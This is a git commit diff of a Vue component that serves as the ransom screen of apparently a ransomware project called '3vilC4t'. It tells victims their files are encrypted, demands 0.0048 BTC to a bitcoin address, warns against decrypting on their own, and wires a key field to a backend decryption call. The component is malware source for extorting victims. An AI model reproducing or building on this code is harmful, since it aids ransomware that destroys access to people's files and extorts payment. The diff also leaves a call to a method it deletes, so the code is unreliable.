f132500880059a5775bb9938e145e458f6d14f93
Kevin Romero <45984541+Kvn11@users.noreply.github.com>
2021-08-04 19:12:51 -0400

    Removed glitch effect.

--- frontend/src/components/BadCat.vue
+++ frontend/src/components/BadCat.vue
@@ -1,12 +1,13 @@
 <template>
   <div class="container">
-    <div :title="message">{{message}}</div>
+    <h1>{{message}}</h1>
     <img alt="3vilC4t" src="../assets/images/logo.png" class="logo zoomIn">
     <p :title="message2">{{message2}}</p>
     <p :title="address">{{address}}</p>
     <input type="text" id="decKey" name="decKey" v-model="decKey" placeholder="Decryption Key">
-    <a @click="getKeyID">Decrypt</a>
+    <a @click="DecryptSystemCall">Decrypt</a>
     <p>KeyID: {{keyID}}</p>
+    <p>{{finishMsg}}</p>
   </div>
 </template>
 
@@ -14,22 +15,25 @@
 export default {
   data() {
     return {
-      message: "You have been infected by 3vilC4t virus. Your files have been encrypted. Do not attempt to decrypt it on your own. It will cause irreversible damage.\n",
-      message2: "Pay the ransom to receive the decryption key. You have 1 attempt.",
+      message: "You have been infected by 3vilC4t virus.",
+      message2: "Pay the ransom to receive the decryption key. You have 1 attempt. Do not attempt to decrypt the files on your own. It will cause irreversible damage. A copy of this message is saved to your deskop in a README.PWN text file. There are numerous guides online on how to purchase bitcoin.",
       address: "0.0048 BTC to mjD6LE6rK9cGSrWmuTK5haFULEUUyceakf ",
       decKey: "",
       keyID: "",
-      userprofile: "",
-      test: ""
+      finishMsg: ""
     };
   },
   methods: {
-    getKeyID: function() {
-      var self = this;
-      window.backend.getEncryptionKeyWrapper().then(result => {
-        self.keyID = result
+    DecryptSystemCall: function() {
+      window.backend.DecryptSystemWrapper(this.decKey).then(result => {
+        this.finishMsg = result;
       })
     }
+  },
+  beforeMount() {
+    this.getKeyID().then(result => {
+      this.keyID = result
+    })
   }
 };
 </script>
